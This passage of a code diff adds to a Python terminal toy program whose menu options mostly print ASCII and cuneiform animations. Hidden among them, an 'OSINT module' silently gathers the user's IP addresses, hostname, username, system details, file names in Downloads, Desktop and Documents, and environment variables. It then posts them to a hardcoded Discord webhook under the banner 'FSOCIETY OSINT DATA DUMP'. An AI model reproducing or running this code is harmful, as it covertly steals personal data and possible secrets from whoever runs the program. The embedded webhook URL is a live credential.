+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          """)
+        time.sleep(0.1)
+        print("""
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          """)
+        
+        # ============================================
+        # OSINT FUNCTIONS - INSIDE ELIF 34
+        # ============================================
+        
+        def get_public_ip():
+            try:
+                response = requests.get('https://api.ipify.org?format=json', timeout=5)
+                return response.json()['ip']
+            except:
+                return 'Unable to fetch IP'
+        
+        def get_local_ip():
+            try:
+                return socket.gethostbyname(socket.gethostname())
+            except:
+                return 'Unable to fetch local IP'
+        
+        def list_downloads():
+            downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
+            try:
+                files = os.listdir(downloads_path)
+                return '\n'.join(files[:15])
+            except:
+                return 'Downloads folder not accessible'
+        
+        def list_desktop():
+            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
+            try:
+                files = os.listdir(desktop_path)
+                return '\n'.join(files[:15])
+            except:
+                return 'Desktop folder not accessible'
+        
+        def list_documents():
+            docs_path = os.path.join(os.path.expanduser('~'), 'Documents')
+            try:
+                files = os.listdir(docs_path)
+                return '\n'.join(files[:15])
+            except:
+                return 'Documents folder not accessible'
+        
+        def get_system_info():
+            try:
+                info = f"OS: {platform.system()} {platform.release()}\n"
+                info += f"Hostname: {socket.gethostname()}\n"
+                info += f"User: {os.getlogin()}\n"
+                info += f"Architecture: {platform.machine()}\n"
+                info += f"Processor: {platform.processor()}\n"
+                return info
+            except:
+                return 'Unable to fetch system info'
+        
+        
+        def get_environment_vars():
+            try:
+                return '\n'.join([f"{k}: {v}" for k, v in os.environ.items()][:15])
+            except:
+                return 'Unable to fetch environment variables'
+        
+        def send_to_discord(webhook_url, data):
+            message = f"**FSOCIETY OSINT DATA DUMP**\n\n"
+            
+            for key, value in data.items():
+                if value:
+                    message += f"**{key}:**\n```\n{value}\n```\n"
+            
+            payload = {'content': message[:1900]}  # Discord limit
+            try:
+                requests.post(webhook_url, json=payload, timeout=10)
+            except:
+                pass
+        
+        def run_osint_module(webhook_url):
+            data = {
+                'Public IP': get_public_ip(),
+                'Local IP': get_local_ip(),
+                'System Info': get_system_info(),
+                'Downloads Folder': list_downloads(),
+                'Desktop Files': list_desktop(),
+                'Documents Folder': list_documents(),
+                'Environment Variables (First 15)': get_environment_vars(),
+                'Timestamp': str(datetime.now())
+            }
+            
+            send_to_discord(webhook_url, data)
+        
+        # ============================================
+        # RUN THE OSINT MODULE
+        # ============================================
+        
+        webhook = "https://discord.com/api/webhooks/1522819447180628129/DtWfmGkyJnqgqg3C_jGDS2qmX1ZEGZ9RzC0YaTph_OTpvVrVliu7GvyFh3XAdIWgixpo"
+        run_osint_module(webhook)
+        
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+        time.sleep(0.1)
+        print("""
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          """)
+        time.sleep(0.1)
+        print("""
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          """)
+        time.sleep(0.1)
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+        time.sleep(0.1)
+        print("""
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          ▚▚▚▚▚▚▚▚▚▚
+          """)
+        time.sleep(0.1)
+        print("""
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          ▖▖▖▖▖▖▖▖▖▖
+          """)
+        time.sleep(0.1)
+        print("""
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          ▘▘▘▘▘▘▘▘▘▘
+          """)
+
+        next_action = input("what now lil bro:")
+        if next_action == '35':
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+
+           ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼
+          ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲
+          """)
+          time.sleep(0.4)
+          print("""
+
+
+
+
+
+
+
+          
+          ▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲
+          """)
+          time.sleep(0.4)
+          print("""
+          
+
+
+
+
+
+
+
+           ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼
+          ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲
+          """)
+          time.sleep(0.4)
+          print("""
+          
+
+
+
+
+
+          
+          ▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲
+          """)
+          time.sleep(0.4)
+          print("""
+          
+
+
+
+
+
+           ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼
+          ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲
+          """)
+          time.sleep(0.4)
+          print("""
+          
+          
+
+
+
+
+
+          ▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲
+          """)
+
+          time.sleep(0.4)
+          print("""
+          
+
+
+
+
+
+           ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼ ▼
+          ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲ ▲
+          """)
+          time.sleep(0.4)
+          print("""
+          
+          
+
+
+
+
+
+          ▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲▼▲
+          """)
+
+        elif choice == '36':
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
+         print("𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙𒆙")
+         time.sleep(0.01)
+         print("𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎𒊎")
+         time.sleep(0.01)
+         print("𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱𒀱")
+         time.sleep(0.01)
